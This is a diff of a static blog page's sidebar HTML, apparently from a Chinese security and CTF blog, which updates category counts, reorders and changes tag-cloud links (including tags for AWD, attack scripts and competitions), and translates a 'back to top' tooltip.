@@ -769,7 +702,7 @@
 		<ul>
 		
 		  
-			<li><a href="/categories/安全竞赛/" title="安全竞赛">安全竞赛<sup>12</sup></a></li>
+			<li><a href="/categories/安全竞赛/" title="安全竞赛">安全竞赛<sup>13</sup></a></li>
 		  
 		
 		  
@@ -790,19 +723,19 @@
 			
 		
 			
-				<li><a href="/tags/AWD/" title="AWD">AWD<sup>2</sup></a></li>
-			
-		
-			
-				<li><a href="/tags/综合渗透/" title="综合渗透">综合渗透<sup>2</sup></a></li>
-			
-		
-			
 				<li><a href="/tags/汇编/" title="汇编">汇编<sup>2</sup></a></li>
 			
 		
 			
-				<li><a href="/tags/学习笔记/" title="学习笔记">学习笔记<sup>2</sup></a></li>
+				<li><a href="/tags/AWD/" title="AWD">AWD<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/铁人三项/" title="铁人三项">铁人三项<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/综合渗透/" title="综合渗透">综合渗透<sup>2</sup></a></li>
 			
 		
 			
@@ -814,7 +747,7 @@
 			
 		
 			
-				<li><a href="/tags/铁人三项/" title="铁人三项">铁人三项<sup>2</sup></a></li>
+				<li><a href="/tags/学习笔记/" title="学习笔记">学习笔记<sup>2</sup></a></li>
 			
 		
 			
@@ -822,11 +755,7 @@
 			
 		
 			
-				<li><a href="/tags/xman/" title="xman">xman<sup>1</sup></a></li>
-			
-		
-			
-				<li><a href="/tags/TensorFlow/" title="TensorFlow">TensorFlow<sup>1</sup></a></li>
+				<li><a href="/tags/攻击脚本/" title="攻击脚本">攻击脚本<sup>1</sup></a></li>
 			
 		
 			
@@ -834,7 +763,15 @@
 			
 		
 			
-				<li><a href="/tags/pdo/" title="pdo">pdo<sup>1</sup></a></li>
+				<li><a href="/tags/TensorFlow/" title="TensorFlow">TensorFlow<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/图像识别/" title="图像识别">图像识别<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/bypass/" title="bypass">bypass<sup>1</sup></a></li>
 			
 		
 			
@@ -843,10 +780,6 @@
 		
 			
 				<li><a href="/tags/error/" title="error">error<sup>1</sup></a></li>
-			
-		
-			
-				<li><a href="/tags/bypass/" title="bypass">bypass<sup>1</sup></a></li>
 			
 		
 			
@@ -862,7 +795,7 @@
 			
 		
 			
-				<li><a href="/tags/图像识别/" title="图像识别">图像识别<sup>1</sup></a></li>
+				<li><a href="/tags/中孚杯/" title="中孚杯">中孚杯<sup>1</sup></a></li>
 			
 		
 		</ul>
@@ -1034,7 +967,7 @@ $(document).ready(function(){
 <!-- Totop Begin -->
 
 	<div id="totop">
-	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
+	<a title="Back to Top"><img src="/img/scrollup.png"/></a>
 	</div>
 	<script src="/js/totop.js"></script>
 
